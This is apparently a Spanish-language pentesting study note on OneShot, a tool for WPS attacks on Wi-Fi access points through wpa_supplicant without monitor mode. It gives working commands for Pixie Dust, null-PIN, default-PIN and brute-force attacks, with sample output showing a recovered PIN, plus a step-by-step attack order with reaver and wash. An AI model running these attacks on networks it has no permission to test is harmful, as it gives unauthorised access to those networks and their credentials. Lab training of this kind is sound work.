---
tags:
  - Wi-Fi/WPS
  - Tipo/Arsenal
  - Pentesting/Explotacion
Descripción: "OneShot sobre wpa_supplicant sin modo monitor, el aviso sobre el repositorio original desaparecido y el reparto de herramientas WPS en 2026"
Fecha de actualización: 2026-08-01
Nota previa: "[[02 - Pixiewps]]"
Nota siguiente: 
Area: "[[Reaver.base|Reaver]]"
---
---

<mark style="background: #ADCCFFA6;">`OneShot` implementa los ataques WPS **sin modo monitor y sin inyección de tramas**: habla con `wpa_supplicant` por su interfaz de control</mark>. Eso lo hace funcionar con adaptadores cuyo driver no inyecta bien, que es donde reaver y bully fallan sin dar pistas.

# Por qué no necesita modo monitor

reaver y bully construyen y transmiten tramas 802.11 crudas, lo que exige un driver con inyección funcional. OneShot en cambio le pide a `wpa_supplicant` que inicie un registro WPS normal y observa el intercambio — <mark style="background: #8000E1A6;">usa la ruta que el sistema operativo ya soporta</mark>, con dos consecuencias:

- Funciona con drivers que no inyectan (varios Realtek con módulos DKMS problemáticos, y chipsets integrados).
- Es **menos anómalo en el aire**: las tramas las genera la pila estándar, con números de secuencia y temporización normales.

> [!warning]+ HTB lo pone en modo monitor y no debe
> El módulo ejecuta `airmon-ng start wlan0` antes de lanzar OneShot. **Es incorrecto**: `wpa_supplicant` no opera sobre una interfaz en modo monitor. Lo que hay que hacer es liberar la interfaz de `NetworkManager` y dejarla en modo *managed* — ver [[05 - Modos de operación y modo monitor]].

# Uso

```shell-session
# Pixie Dust
$ sudo python3 oneshot.py -i wlan0 -b 86:FC:9F:5D:67:4E -K

[*] Running wpa_supplicant…
[*] Trying PIN '61212947'…
[*] Seed ES1: 0x00000000
[*] Seed ES2: 0x00000000
[+] WPS pin: 32552273
[*] Time taken: 0 s 27 ms
```

```shell-session
# Push Button Configuration
$ sudo python3 oneshot.py -i wlan0 --pbc
```

| Opción | Función |
| ------ | ------- |
| `-i` | Interfaz (en modo **managed**) |
| `-b` | BSSID del objetivo |
| `-K, --pixie-dust` | Ataque Pixie Dust |
| `--pbc` | Registro por botón |
| `-p, --pin` | PIN concreto |
| `-B, --bruteforce` | Fuerza bruta con retraso inteligente |
| `-d, --delay` | Retardo entre intentos |
| `-w, --write` | Guardar las credenciales obtenidas |
| `--iface-down` | Bajar la interfaz al terminar |
| `-l, --loop` | Repetir hasta conseguirlo |

Integra además la generación de PIN por fabricante, así que cubre en una sola herramienta lo que en el flujo clásico requiere `wpspin` + `reaver`.

> [!warning]+ El repositorio original ya no existe
> `drygdryg/OneShot` fue el proyecto de referencia durante años y **ha desaparecido de GitHub** (comprobado el 2026-08-01), igual que su hermano `drygdryg/wpspin`. El fork vivo es **[fulvius31/OneShot](https://github.com/fulvius31/OneShot)**, con cambios en junio de 2026.
>
> <mark style="background: #FF5582A6;">Un nombre de proyecto huérfano es un blanco para suplantación</mark>: cualquiera puede publicar un repositorio con ese nombre y recibir el tráfico de los enlaces antiguos. Antes de ejecutar como root una herramienta clonada, revisar el código —son unos pocos miles de líneas de Python legible— y comprobar la actividad del autor.

# Reparto de herramientas WPS

| Necesidad | Herramienta | Estado |
| --------- | ----------- | ------ |
| Reconocimiento pasivo | `wash` · `airodump-ng --wps` | Activo |
| Fuerza bruta online | `reaver` | `master` activo, release 2020 |
| Segunda implementación | `bully` | Estancado desde 2023 |
| Sin modo monitor / driver malo | **`OneShot`** | Activo |
| Motor Pixie Dust | `pixiewps` | Activo |
| Generación de PIN | `wpspin` · `WPS-PIN` · `nmk` | Dispar |
| DoS / desbloqueo | `mdk4` | Activo |
| Todo integrado | **`airgeddon`** | **Muy activo** |

# El orden que funciona

```shell-session
# 1 · Pasivo: ¿hay WPS y en qué estado?
$ sudo wash -i mon0

# 2 · Pixie Dust — un intercambio
$ sudo reaver -K -vvv -i mon0 -b <BSSID> -c <canal>

# 3 · Si el driver da problemas, la misma jugada sin monitor
$ sudo python3 oneshot.py -i wlan0 -b <BSSID> -K

# 4 · PIN nulo
$ sudo reaver -i mon0 -b <BSSID> -c <canal> -p ""

# 5 · PINs por defecto
$ wpspin <BSSID> | grep -Eo '\b[0-9]{8}\b' > pins.txt

# 6 · Canjear el PIN encontrado
$ sudo reaver -i mon0 -b <BSSID> -c <canal> -p <PIN>
```

<mark style="background: #FFB8EBA6;">Para un engagement completo, `airgeddon` encadena todo esto desde un menú</mark> y es de lo poco del ecosistema que sigue recibiendo cambios (julio de 2026). Las herramientas sueltas siguen haciendo falta para control fino y para depurar por qué algo falla.

# Diagnóstico rápido cuando nada funciona

| Síntoma | Comprobación |
| ------- | ------------ |
| reaver y bully fallan al asociarse | `aireplay-ng --test mon0` — ¿inyecta? |
| La inyección falla | Probar OneShot, que no la necesita |
| OneShot tampoco | `NetworkManager` interfiere; liberarlo |
| Todo falla contra un AP concreto | ¿Está bloqueado? `wash` lo dice |
| Todo falla contra todos los APs | Driver o chipset — [[04 - Interfaces, chipsets y drivers]] |

El contexto completo de estos ataques está en [[00 - Qué es WPS y por qué sigue vivo]] y el estado del protocolo en [[12 - Arsenal y estado de WPS en 2026]].
